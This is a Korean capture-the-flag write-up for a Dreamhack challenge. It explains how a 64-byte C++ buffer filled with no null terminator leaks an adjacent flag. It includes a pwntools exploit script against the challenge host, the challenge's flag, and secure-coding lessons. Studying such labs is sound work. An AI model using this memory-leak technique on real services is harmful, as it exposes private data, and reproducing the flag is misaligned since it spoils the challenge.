# 문제명
- cpp_string

## 문제 설명

> C++의 문자열 및 버퍼 처리 방식을 이해하고 취약점을 분석하여 플래그를 획득하는 문제입니다.
- host3.dreamhack.games:11665

## 풀이

### 분석

이 문제는 간단한 파일 시스템 구조를 C++로 모의 구현하고 있습니다. 사용자 입력을 처리하는 주요 메뉴는 다음과 같습니다.메뉴 1은 파일 목록 확인 및 특정 파일 내용 출력이고 메뉴 2는 버퍼에 새로운 파일 내용(Contents) 작성, 메뉴 3은 프로그램 종료 또는 서브 메뉴 선택입니다. 메모리 상에서 사용자 입력을 받는 버퍼의 바로 뒤에 플래그 또는 비밀 데이터가 저장되어 있습니다. C/C++에서 문자열 출력 함수(std::cout 또는 printf("%s"))는 널 바이트(\x00)를 만날 때까지 연속된 메모리를 계속 읽어서 출력합니다.
### 취약점

널 바이트 누락으로 인한 메모리 유출입니다. 2번 메뉴를 통해서 64바이트 크기의 버퍼에 널 바이트 없이 정확히 64바이트의 문자열('a' * 64)을 가득 채우면 문자열의 끝을 표시하는 널 종료 문자(\0)가 사라집니다. 이 상태에서 1번 및 3번 메뉴를 통해 해당 버퍼를 출력하면 경계를 넘어 인접 메모리에 위치한 플래그 문자열까지 함께 출력되는 취약점이 발생합니다.

### 익스플로잇


```python
from pwn import *

HOST = 'host3.dreamhack.games'
PORT = 11665
p = remote(HOST, PORT)

payload = b'a' * 64

p.recvuntil(b'[*] input : ')
p.sendline(b'2')
p.recvuntil(b'contents : ')
p.sendline(payload)

p.recvuntil(b'[*] input : ')
p.sendline(b'1')
p.recvuntil(b'[*] input : ')
p.sendline(b'3')

leak_data = p.recvuntil(b'Simple file system')
print(leak_data.decode(errors='ignore'))

p.interactive()
```

## 플래그

```
DH{549390a9beb20a8d0e9a6aa0efcb571f}
```

## 배운 점

문자열 종료 조건의 중요성에 대해 배웠습니다. C 나 C++ 환경에서 문자열을 다룰 때 널 바이트(\x00)가 누락되면 인접한 메모리 영역까지 무단으로 읽혀 중요 정보가 유출될 수 있음을 확인했습니다. 그리고 사용자 입력을 버퍼 크기보다 1바이트 이상 작게 받아 항상 널 바이트가 들어갈 공간을 확보하거나 std::string의 안전한 길이 기반 메서드를 사용해야 안전하다는 점을 배웠습니다. 또한 메모리 유출 취약점을 자동화 스크립트로 트리거하고 원하는 데이터를 효율적으로 수집하는 과정을 익힐 수 있었습니다.
